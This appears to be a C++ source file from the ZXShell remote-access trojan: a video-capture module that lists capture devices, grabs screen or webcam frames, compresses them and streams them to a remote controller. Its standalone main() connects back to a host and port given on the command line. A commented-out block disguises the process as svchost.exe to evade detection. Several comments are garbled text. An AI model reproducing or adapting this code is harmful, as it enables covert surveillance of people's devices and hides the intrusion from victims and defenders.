
#include "capMain.h"

CAPMAIN::CAPMAIN(SOCKET s)
{
	comprAutoSel = 1;
	m_socket = s;
	m_comprLevel = 9;
	runFlag = true;
}

CAPMAIN::~CAPMAIN()
{

}

int WINAPI CAPMAIN::capUpdate(int DataType, BYTE *buffer, int datalen)
{
	int ret;
	_rdpBufferEncodeZlib zlib;
	_tagZLIBINFO zinfo;
	_tagRDPHEAD rdph;

	if(!zbmpbuf.checkBufferSize(datalen, false))
		return 0;

	DWORD zbmpsize = zbmpbuf.GetSize();

	if(DataType == CAPP_CAPDEVLIST)
	{
		if(zlib.do_gzip(zbmpbuf, &zbmpsize, 
			buffer, datalen, 8) != 0)
			return 0;
		//���������б� 
		rdph.action = CAPP_CAPDEVLIST;
		rdph.flag = us_ZLIB;//always == us_ZLIB
		rdph.dataSize = zbmpsize;

		zinfo.uncomprLen = datalen;
		
		speedtest.Start(0);

		if(!sockdata.SendDataGZip(&rdph, &zinfo, zbmpbuf, zbmpsize))
		{
			speedtest.Stop(rdph.dataSize);
			return 0;
		}
		
		speedtest.Stop(rdph.dataSize);
	}else 
	if(DataType == CAPP_DEVICESTATUS)
	{
		int flag = *(int*)buffer;

		if(flag != 0)
		{
			runFlag = 0;
			return 0;
		}
	}else 
	if(DataType == CAPP_BITMAPINFO)
	{
		if(zlib.do_gzip(zbmpbuf, &zbmpsize, 
			buffer, datalen, 8) != 0)
			return 0;
		//����λͼ��Ϣ
		rdph.action = CAPP_BITMAPINFO;
		rdph.flag = us_ZLIB;//always == us_ZLIB
		rdph.dataSize = zbmpsize;

		zinfo.uncomprLen = datalen;
		
		speedtest.Start(0);

		if(!sockdata.SendDataGZip(&rdph, &zinfo, zbmpbuf, zbmpsize))
		{
			speedtest.Stop(rdph.dataSize);
			return 0;
		}
		
		speedtest.Stop(rdph.dataSize);

	}else 
	if(DataType == CAPP_UPDATEVIDEO)
	{
		//������Ļ���������DIB, RECT + DIB
		if(comprAutoSel)//����ѡ��ѹ������
			m_comprLevel = speedtest.GetRCMLevel(speedtest.GetumSpeed(), rCap.GetCurrentPixelBits());

		m_comprLevel = min(m_comprLevel, 8);
		if(m_comprLevel > 0)
		{
			zlib.SetCompressLevel(m_comprLevel);

			if(zlib.do_gzip(zbmpbuf, &zbmpsize, 
				buffer, datalen) != 0)
				return 0;
			rdph.action = CAPP_UPDATEVIDEO;
			rdph.flag = us_ZLIB;
			rdph.dataSize = zbmpsize;
		}else
		{
			rdph.action = CAPP_UPDATEVIDEO;
			rdph.flag = us_NULL;
			rdph.dataSize = datalen;
		}

		speedtest.Start(0);

		if(rdph.flag == us_ZLIB)
		{
			zinfo.uncomprLen = datalen;

			if(!sockdata.SendDataGZip(&rdph, &zinfo, zbmpbuf, zbmpsize))
			{
				speedtest.Stop(sizeof(zinfo)+zbmpsize);
				return 0;
			}

		}else
		{
			if(!sockdata.SendData(&rdph, buffer, rdph.dataSize))
			{
				speedtest.Stop(rdph.dataSize);
				return 0;
			}
		}
		
		speedtest.Stop(rdph.dataSize);

	}


	return 1;
}

int WINAPI CAPMAIN::capUpdate(int DataType, BYTE *buffer, int datalen, void *lParam)
{
	CAPMAIN *capmain = (CAPMAIN *)lParam;

	return capmain->capUpdate(DataType, buffer, datalen);
}

BOOL CAPMAIN::ReadAction()
{
	int ret;
	
	_tagRDPHEAD rdph;//������Ϣʹ�þֲ����������ͷ��ͳ�ͻ
	_WINMSG event;

	if(!Recv(m_socket, (char*)&rdph, sizeof(rdph)))
		return 0;

	switch(rdph.action)
	{

		case CAPP_SETCAPTUREDRV:
		{
			if(rdph.dataSize != 0)
				return 0;

			if(!rCap.InitCapDevice(rdph.flag))
			{
				rdph.action = CAPP_DEVICESTATUS;
				rdph.flag = 3;
				rdph.dataSize = 0;

				sockdata.SendAction(&rdph);
			}
			break;
		}
		case CAPP_SETCOMPRLEVEL:
		{
			if(rdph.dataSize != 0)
				return 0;
			
			if(rdph.flag == 0xff)
				comprAutoSel = 1;
			else
			{
				comprAutoSel = 0;
				m_comprLevel = rdph.flag;
			}
			break;
		}
		case CAPP_CAPSTOP:
		{
			if(rdph.dataSize != 0)
				return 0;
			rCap.CaptureStop();

			rdph.action = CAPP_DEVICESTATUS;
			rdph.flag = 2;
			rdph.dataSize = 0;

			sockdata.SendAction(&rdph);
			break;
		}

		default:
			return 0;

	}

	return 1;
}

int CAPMAIN::go()
{
	int ret;
	_tagRDPHEAD r;

	if(!sockdata.init(m_socket))
		return 0;


	if(!rCap.EnumDev())
	{
		//no cap device
		r.action = CAPP_DEVICESTATUS;
		r.flag = 1;
		r.dataSize = 0;

		sockdata.SendAction(&r);
		return 0;
	}else
	{
		//cap device exsits
		if(!capUpdate(CAPP_CAPDEVLIST, (BYTE*)rCap.capDrivers.capDrv, sizeof(rCap.capDrivers.capDrv)))
			return 0;
		r.action = CAPP_DEVICESTATUS;
		r.flag = 0;
		r.dataSize = 0;

		sockdata.SendAction(&r);
	}
	//
	r.action = CAPP_VERSION;
	r.flag = 0;
	*(float*)&r.dataSize = CAPPVERSION;

	sockdata.SendAction(&r);

	while(runFlag)
	{

		ret = SetTimeOut(m_socket, true, false, 0);
		if(ret < 0)
			break;

		//�׽����пɶ�ȡ����
		if(ret > 0)
		{
			//��������client����Ϣ����
			if(!ReadAction())
				break;
		}
		//����λͼ���

		if(!rCap.GetFrame(capUpdate, this))
			break;

		if(!rCap.bBmpUpdated())
			Sleep(24);
	}

	rCap.CaptureStop();

	return 1;
}

DWORD WINAPI CAPMAIN::capServer(LPVOID lParam)
{
	SOCKET Socket = (SOCKET)lParam;

	CAPMAIN *capsrv = new CAPMAIN(Socket);

	capsrv->go();

	delete capsrv;

	closesocket(Socket);
	return 0;
}

#if !defined _ZXSHELL

void main(int argc, char **argv)
{
	char ip[100], fakepath[MAX_PATH];
	int port = 1234;

	if(argc == 2)
	{
		strcpy(ip, argv[1]);
	}else
	if(argc == 3)
	{
		strcpy(ip, argv[1]);
		port = atoi(argv[2]);
	}else
		strcpy(ip, "127.0.0.1");

/*	GetSystemDirectory(fakepath, MAX_PATH);
	strcat(fakepath, "\\svchost.exe");

	ModifyCmdLine(GetCurrentProcessId(), fakepath);
*/
	InitSock();

	SOCKET Socket;

	Socket = ConnectHost(ip, port);

	CAPMAIN::capServer((LPVOID)Socket);
}

#endif